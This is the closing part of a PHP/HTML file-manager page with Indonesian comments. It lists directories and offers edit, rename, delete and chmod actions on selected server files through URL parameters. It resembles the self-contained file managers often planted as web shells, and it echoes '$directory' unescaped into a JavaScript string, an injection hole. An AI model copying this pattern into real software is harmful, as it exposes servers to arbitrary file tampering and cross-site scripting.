                <?php if (is_dir($filePath)): ?>
                    <a href="?dir=<?php echo urlencode($filePath); ?>" class="icon">
                        <i class="fas fa-folder folder-icon"></i>
                    </a>
                <?php else: ?>
                    <div class="icon">
                        <i class="fas fa-file-alt file-icon"></i>
                    </div>
                <?php endif; ?>

                <div class="file-name">
                    <?php if (is_dir($filePath)): ?>
                        <a href="?dir=<?php echo urlencode($filePath); ?>" class="value-info">
                            <?php echo htmlspecialchars($file); ?>
                        </a>
                    <?php else: ?>
                        <?php echo htmlspecialchars($file); ?>
                    <?php endif; ?>
                </div>
            </li>
        <?php endforeach; ?>
    <?php else: ?>
        <li class="file-item">Tidak ada file atau folder di sini.</li>
    <?php endif; ?>
</ul>

<div class="select-options">
    <select id="actionSelect">
        <option value="">Options</option>
        <option value="edit">Edit</option>
        <option value="rename">Rename</option>
        <option value="delete">Delete</option>
        <option value="chmod">Chmod</option>
    </select>
    <button class="select-button" onclick="performAction()">Select</button>
</div>

<script>
    // Fungsi untuk menangani aksi yang dipilih
    function performAction() {
        var selectedFile = document.querySelector('input[name="file_selection"]:checked');
        var action = document.getElementById('actionSelect').value;

        if (!selectedFile) {
            alert('Please select a file!');
            return;
        }

        if (!action) {
            alert('Please select an action!');
            return;
        }

        window.location.href = '?action=' + action + '&file=' + encodeURIComponent(selectedFile.value) + '&dir=' + encodeURIComponent('<?php echo $directory; ?>');
    }
</script>

</body>
</html>